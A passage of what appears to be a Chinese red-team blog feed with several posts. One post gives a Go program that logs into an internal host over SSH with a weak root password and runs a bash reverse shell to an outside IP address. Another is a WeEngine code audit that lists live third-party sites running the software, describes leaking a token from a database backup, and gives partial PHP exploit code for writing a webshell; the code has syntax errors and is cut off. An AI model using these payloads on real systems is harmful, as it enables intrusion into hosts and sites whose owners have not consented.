    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>自动化连接ssh并反弹shell</title>
    <link href="http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2024-05-07T13:35:51.000Z</published>
    <updated>2025-08-14T14:04:58.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-应用场景"><a href="#0x01-应用场景" class="headerlink" title="0x01 应用场景"></a>0x01 应用场景</h1><p>一个命令执行的口子</p><p>主机不出网</p><p>当前是nobody权限，web目录是root权限，写webshell没权限</p><p>通过一个ctf技巧搞了一个webshell，能上传文件但是不能执行命令</p><p>通过webshell将fscan上传到/tmp目录下，通过入口的命令执行漏洞执行fscan，发现内网有ssh弱口令</p><h1 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h1><p>已知连接ssh的同时可以执行命令<br><img src="/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/image-20230731085919496.png" alt="image"><br>当时的想法是连接ssh，然后执行命令反弹shell，但是连接ssh需要交互式shell，第一时间想到expect，经测试主机上没有expect，然后想到通过python中的pexpect去做这件事，发现目标中的python缺少依赖，如果上传python依赖到对应的依赖库目录太麻烦了，最后想到用go去实现，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line"></span><br><span class="line">&quot;golang.org/x/crypto/ssh&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">username = &quot;root&quot;</span><br><span class="line">password = &quot;P@ssw0rd!&quot;</span><br><span class="line">addr     = &quot;10.62.139.19:22&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">config := &amp;ssh.ClientConfig &#123;</span><br><span class="line">User: username,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.Password(password),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client, err := ssh.Dial(&quot;tcp&quot;, addr, config)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to dial: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer client.Close()</span><br><span class="line"></span><br><span class="line">// 开启一个session，用于执行一个命令</span><br><span class="line">session, err := client.NewSession()</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to create session: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"></span><br><span class="line">// 执行命令，并将执行的结果写到 b 中</span><br><span class="line">var b bytes.Buffer</span><br><span class="line">session.Stdout = &amp;b</span><br><span class="line"></span><br><span class="line">// 也可以使用 session.CombinedOutput() 整合输出</span><br><span class="line">if err := session.Run(&quot;bash -i &gt;&amp; /dev/tcp/123.249.104.83/1234 0&gt;&amp;1&quot;); err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to run: &quot; + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(b.String())  // root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实是在赌目标主机出网，盲打成功接收到反弹shell那一刻，还是挺爽的~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-应用场景&quot;&gt;&lt;a href=&quot;#0x01-应用场景&quot; class=&quot;headerlink&quot; title=&quot;0x01 应用场景&quot;&gt;&lt;/a&gt;0x01 应用场景&lt;/h1&gt;&lt;p&gt;一个命令执行的口子&lt;/p&gt;
&lt;p&gt;主机不出网&lt;/p&gt;
&lt;p&gt;当前是nobody权限，</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="内网横向" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>小程序-多用户微博系统</title>
    <link href="http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/"/>
    <id>http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/</id>
    <published>2024-05-07T13:30:01.000Z</published>
    <updated>2025-07-31T00:52:20.464Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前有段时间在搞小程序开发，搞来搞去最终放弃了，不过收获还是蛮多的，记得刚入行安全时，一直想学开发，总觉得不懂开发就搞不好安全，现在也算圆了这个执念，学习开发对安全是有帮助的，不过现在想对那时的自己说一句，不用专门学开发也可以把安全搞得好</p><h1 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h1><p>一个简易的多用户微博系统，每个人都可以在上面留言，欢迎大家留言，地址：<a href="https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/">https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/</a></p><p>截图如下：<br><img src="/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/01.jpg" alt="image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;之前有段时间在搞小程序开发，搞来搞去最终放弃了，不过收获还是蛮多的，记得刚入行安全时，一直想学开发，</summary>
      
    
    
    
    <category term="工具开发" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="微信小程序" scheme="http://example.com/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>分享一个自己开发的工具</title>
    <link href="http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/</id>
    <published>2024-05-07T13:25:18.000Z</published>
    <updated>2025-07-31T00:45:59.358Z</updated>
    
    <content type="html"><![CDATA[<p>程序流程如下<br><img src="/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/01.png" alt="image"></p><p>之前做红队时自己开发的工具，代码完全开源到GitHub，地址：<a href="https://github.com/ybdt/RuiningGather-Python">https://github.com/ybdt/RuiningGather-Python</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;程序流程如下&lt;br&gt;&lt;img src=&quot;/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/01.pn</summary>
      
    
    
    
    <category term="工具开发" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>向日葵旧版本下载</title>
    <link href="http://example.com/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/"/>
    <id>http://example.com/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/</id>
    <published>2024-04-28T12:29:09.000Z</published>
    <updated>2025-07-31T00:50:50.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-成果"><a href="#0x01-成果" class="headerlink" title="0x01 成果"></a>0x01 成果</h1><p>可下载15.3.2.62919（截止到2024.04.03的最新版）到12.5.1.44969之间的任意版本，如下图<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/01.png" alt="image"><br>更旧的版本不能下载，原因见下文</p><h1 id="0x02-起源"><a href="#0x02-起源" class="headerlink" title="0x02 起源"></a>0x02 起源</h1><p>想用旧版本向日葵测试一个功能，发现官网只提供最新版下载，故研究下如何下载旧版本</p><h1 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h1><p>下载页面点击下载后，burp抓包，依次筛选每个请求包，发现如下请求包最像下载链接<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/02.png" alt="image">  如图可看到，根据参数versionid指定版本，试了下2225、2224都返回404，看来不是每个数字都有对应版本，写个python脚本生成1到2226的字典，请求包扔到Intruder中进行爆破，发现如上请求id返回302<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/03.png" alt="image">  ok，现在我们可以根据id下载对应版本</p><h1 id="0x04-遗憾"><a href="#0x04-遗憾" class="headerlink" title="0x04 遗憾"></a>0x04 遗憾</h1><p>经测试，版本SunloginClient_12.5.0.44227_x64.exe及之前的版本，下载后会返回404，猜测可能官方给删除了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-成果&quot;&gt;&lt;a href=&quot;#0x01-成果&quot; class=&quot;headerlink&quot; title=&quot;0x01 成果&quot;&gt;&lt;/a&gt;0x01 成果&lt;/h1&gt;&lt;p&gt;可下载15.3.2.62919（截止到2024.04.03的最新版）到12.5.1.44969之间的</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="环境搭建" scheme="http://example.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>微擎审计</title>
    <link href="http://example.com/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/</id>
    <published>2024-04-22T12:18:00.000Z</published>
    <updated>2025-08-14T14:03:48.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-目标熟悉"><a href="#0x01-目标熟悉" class="headerlink" title="0x01 目标熟悉"></a>0x01 目标熟悉</h1><p>软件简介：微擎是宿州市微擎云计算有限公司开发的一款免费开源的微信公众号管理系统</p><p>官网地址：<a href="https://www.w7.cc/">https://www.w7.cc/</a></p><p>开发文档<a href="https://wiki.w7.com/document/35/370">https://wiki.w7.com/document/35/370</a>中提到，源代码位于：<a href="https://gitee.com/we7coreteam/pros">https://gitee.com/we7coreteam/pros</a></p><p>根据在线文档<a href="https://wiki.w7.com/document">https://wiki.w7.com/document</a>中的更新公告，最新版是2.7.50</p><p>根据开源代码库<a href="https://gitee.com/we7coreteam/pros/tree/master/upgrade">https://gitee.com/we7coreteam/pros/tree/master/upgrade</a>中的记录，最新版是2.7.9</p><p>网站搭建好后，在底部又发现最新版是2.7.108，有点奇怪</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>搭建微擎的过程中踩了很多坑，以下2个坑想搭建的师傅有个心理准备：  </p><p>1 微擎的版本挺错乱的，下载后是2.7.108，结果搭建完成后底部却显示2.7.94，同样其他版本也是，下载时是一个版本，搭建后又是另一个版本  </p><p>2 在官网上已经不再提供离线安装的版本，而且提供的安装包<a href="https://gitee.com/we7coreteam/pros">https://gitee.com/we7coreteam/pros</a>也是很多功能不全，必须要在官网注册认证过了才能通过在线升级来获取到全部功能，有点让人无语</p><p>下面是对官网提供的安装脚本的安装演示，一开始使用mac下的php集成环境MAMP，结果在最后一步连接数据库的时候会有问题，这里改用windows下集成环境phpstudy，将项目放到phpstudy对应目录下，访问后按提示操作即可，搭建完成如下图<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221205225919717.png" alt="image-20221205225919717"></p><p>访问目标地址，发现是已登录状态<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221205230926175.png" alt="image-20221205230926175"></p><p>使用全新的浏览器访问目标地址，可看到未登录状态下首页如下图<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221205230806912.png" alt="image-20221205230806912"></p><p>下图是踩坑时搭建的多个版本<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221208234726862.png" alt="image-20221208234726862"><br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221208235104390.png" alt="image-20221208235104390">  </p><h1 id="0x03-互联网案例"><a href="#0x03-互联网案例" class="headerlink" title="0x03 互联网案例"></a>0x03 互联网案例</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://www.zxida.com/web/</span><br><span class="line">https://39.98.239.118/web/</span><br><span class="line">https://www.cdwjsq.com/web/</span><br><span class="line">https://mp.wxquan.cn/web/</span><br><span class="line">http://49.234.65.194/web/</span><br><span class="line">http://wx.mindmob.cn/web/</span><br><span class="line"></span><br><span class="line">intitle:&quot;微擎 - 公众平台自助引擎 - Powered by W7.CC&quot;</span><br></pre></td></tr></table></figure><h1 id="0x04-开始审计"><a href="#0x04-开始审计" class="headerlink" title="0x04 开始审计"></a>0x04 开始审计</h1><h2 id="01-目录结构"><a href="#01-目录结构" class="headerlink" title="01 目录结构"></a>01 目录结构</h2><p>源码下载到本地后，可以看到目录结构如下<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221206092703445.png" alt="image-20221206092703445"></p><p>对上述目录结构解释如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">addons             微擎模块</span><br><span class="line">api                对接外部系统接口</span><br><span class="line">app                微站 （Mobile / App）</span><br><span class="line">data               存放配置文件</span><br><span class="line">framework          微擎框架</span><br><span class="line">payment            支付调用目录</span><br><span class="line">tester             测试用例</span><br><span class="line">upgrade            升级脚本</span><br><span class="line">web                后台管理</span><br><span class="line">api.php            微信api接口</span><br><span class="line">console.php        命令行执行文件</span><br><span class="line">index.php          系统入口</span><br><span class="line">install.php        安装文件</span><br><span class="line"></span><br><span class="line">attachment         附件目录</span><br></pre></td></tr></table></figure><h2 id="02-确定路由"><a href="#02-确定路由" class="headerlink" title="02 确定路由"></a>02 确定路由</h2><p>当传入的URL请求中包含一个名为 <strong>c</strong> 、 <strong>a</strong> 、 <strong>do</strong> 的 GET 参数，它即被视为一个路由，其中c为控制器（controller），a为操作（action），do为行为（do），且do是可选的，也就是不指定的话会使用默认行为，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://we7.cc/web/index.php?c=platform&amp;a=menu&amp;</span><br><span class="line">则会路由至 /web/source/platform/menu.ctrl.php 文件中</span><br><span class="line"></span><br><span class="line">http://we7.cc/app/index.php?c=mc&amp;a=home&amp;</span><br><span class="line">则会路由至 /app/source/mc/home.ctrl.php 文件中</span><br></pre></td></tr></table></figure><p>控制器以文件夹、文件的形式组织，位于系统的 <strong>source</strong> 目录下，每一个目录代表一个 <strong>controller</strong> ，文件夹中的每个文件即为一个 <strong>action</strong>。某些情况，一个action可能会包含多个操作，系统中提供 <strong>do</strong> 参数来用于区分同一个 <strong>action</strong> 中的不同操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如，extension为控制器，module为action，designer为该action下的某一个具体的do</span><br><span class="line">http://pro.we7.cc/web/index.php?c=extension&amp;a=module&amp;do=designer</span><br></pre></td></tr></table></figure><p>微擎中对于模块的访问，使用的路由会稍微不一样，当传入的 <strong>c</strong> 值为 “site”, <strong>a</strong> 值为 “entry”时则是一个模块路由，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://we7.cc/web/index.php?c=site&amp;a=entry&amp;do=themeset&amp;m=we7_demo</span><br><span class="line">则会路由至 /addons/we7_demo/site.php 文件中的 doWebThemeset() 方法</span><br><span class="line"></span><br><span class="line">http://we7.cc/app/index.php?i=1&amp;j=2&amp;c=entry&amp;do=list&amp;m=we7_demo</span><br><span class="line">则会路由至 /addons/we7_demo/site.php 文件中的 doMobileList() 方法</span><br></pre></td></tr></table></figure><h2 id="03-确定鉴权"><a href="#03-确定鉴权" class="headerlink" title="03 确定鉴权"></a>03 确定鉴权</h2><p>文档中提到，移动端代码位于目录/app/下，web段代码位于目录/web/下，我们先看下web端代码，目录结构如下<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221206153500089.png" alt="image-20221206153500089"></p><p>其中入口文件为index.php，通读index.php后会发现，鉴权主要由如下代码实现<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221206153714847.png" alt="image-20221206153714847"></p><p>可看到如果访问的是无需鉴权的接口，则直接跳到对应controller及action处，否则会调用checklogin()，也就是需要检查登录状态</p><p>其中$acl在上面被定义为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$acl = require IA_ROOT . &#x27;/web/common/permission.inc.php&#x27;;</span><br></pre></td></tr></table></figure><p>进入文件permission.inc.php可看到，控制器advertisement下面无可直接访问的action，控制器article下面notice-show，news-show，notice-news是可直接访问的<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221206155010265.png" alt="image-20221206155010265"></p><p>依照此规律，可梳理出前台访问的接口，及后台访问的接口</p><h2 id="04-前台漏洞"><a href="#04-前台漏洞" class="headerlink" title="04 前台漏洞"></a>04 前台漏洞</h2><p>前台接口中暂未发现漏洞点</p><h2 id="05-后台漏洞"><a href="#05-后台漏洞" class="headerlink" title="05 后台漏洞"></a>05 后台漏洞</h2><h3 id="漏洞1：已公开但无POC"><a href="#漏洞1：已公开但无POC" class="headerlink" title="漏洞1：已公开但无POC"></a>漏洞1：已公开但无POC</h3><p>漏洞出现在web/source/cloud/dock.ctrl.php<br><img src="/2024/04/22/%E5%BE%AE%E6%93%8E%E5%AE%A1%E8%AE%A1/image-20221209092535245.png" alt="image-20221209092535245"></p><p>简单讲述一下代码逻辑（搞懂逻辑，才能构造exp），根据之前的路由分析可知，传入的动作为download时，进入子句</p><p>传入的post数据如果进行了base64编码，则解码后赋值给data，否则直接赋值给data，对data进行反序列化，反序列化后先对数组中的file进行base64解码，再判断是否存在gzcompress和gzuncompress，存在的话再进行解压，最后赋值给file</p><p>从缓存中获取cloud_transtoken，并传入authcode进行解密，赋值给全局变量$_W中的setting-&gt;site-&gt;token，对file进行md5加密再拼接数组中的path以及全局变量$_W中的setting-&gt;site-&gt;token，最后赋值给string</p><p>如果全局变量$_W中的setting-&gt;site-&gt;token非空，且string进行md5加密后等于数组中的sign，则进入子句</p><p>判断数组中的path是否以”/web”或”/framework”开头，此处我们在构造数组中path的时候只需以”/“开头即可绕过，绕过后子句中构造数组path的全路径，最后调用file_put_contents写入webshell</p><p>这里有一个难点，就是从缓存中获取cloud_transtoken，全局搜索，通过分析发现，访问链接 <a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 进行数据库备份，则数据库备份文件的地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql，拿到数据库备份后，全局搜索cloud_transtoken，可获取cloud_transtoken的值，对应的exp编写如下">http://ip:port/data/backup/123/volume-456-1.sql，拿到数据库备份后，全局搜索cloud_transtoken，可获取cloud_transtoken的值，对应的exp编写如下</a></p><p>简单解释一下，调用项目中的函数authcode，传入cloud_transtoken，获取返回的值，根据之前分析的代码逻辑，反向构造原始数据包，并将payload嵌入其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function authcode($string, $operation = &#x27;DECODE&#x27;, $key = &#x27;&#x27;, $expiry = 0) &#123;</span><br><span class="line">    $ckey_length = 4;</span><br><span class="line">    $key = md5(&#x27;&#x27; != $key ? $key : &quot;62a37a4d&quot;);</span><br><span class="line">    $keya = md5(substr($key, 0, 16));</span><br><span class="line">    $keyb = md5(substr($key, 16, 16));</span><br><span class="line">    $keyc = $ckey_length ? (&#x27;DECODE&#x27; == $operation ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    $cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">    $key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">    $string = &#x27;DECODE&#x27; == $operation ? base64_decode(substr($string, $ckey_length)) : sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;</span><br><span class="line">    $string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">    $result = &#x27;&#x27;;</span><br><span class="line">    $box = range(0, 255);</span><br><span class="line"></span><br><span class="line">    $rndkey = array();</span><br><span class="line">    for ($i = 0; $i &lt;= 255; ++$i) &#123;</span><br><span class="line">        $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for ($j = $i = 0; $i &lt; 256; ++$i) &#123;</span><br><span class="line">        $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">        $tmp = $box[$i];</span><br><span class="line">        $box[$i] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for ($a = $j = $i = 0; $i &lt; $string_length; ++$i) &#123;</span><br><span class="line">        $a = ($a + 1) % 256;</span><br><span class="line">        $j = ($j + $box[$a]) % 256;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (&#x27;DECODE&#x27; == $operation) &#123;</span><br><span class="line">        if ((0 == substr($result, 0, 10) || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123;</span><br><span class="line">            return substr($result, 26);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#x27;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return $keyc . str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cloud_transtoken = &quot;&quot;</span><br><span class="line">$token = authcode($cloud_transtoken, &quot;DECODE&quot;);</span><br><span class="line"></span><br><span class="line">function build() &#123;</span><br><span class="line">    $file = &quot;aaa&quot;;</span><br><span class="line">    $path = &quot;/test.txt&quot;</span><br><span class="line">    $string = (md5($file) . $path . $token);</span><br><span class="line">    $sign = md5($string)</span><br><span class="line"></span><br><span class="line">    $file_ = gzcompress($file);</span><br><span class="line">    // print($file_);</span><br><span class="line">    $file__ = base64_encode($file_);</span><br><span class="line">    // print($file__);</span><br><span class="line"></span><br><span class="line">    $ret = array(</span><br><span class="line">        &quot;file&quot; =&gt; $file__,</span><br><span class="line">        &quot;path&quot; =&gt; $path,</span><br><span class="line">        &quot;sign&quot; =&gt; $sign</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    print(serialize($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// build();</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">$gz = function_exists(&#x27;gzcompress&#x27;) &amp;&amp; function_exists(&#x27;gzuncompress&#x27;);</span><br><span class="line">if ($gz) &#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span 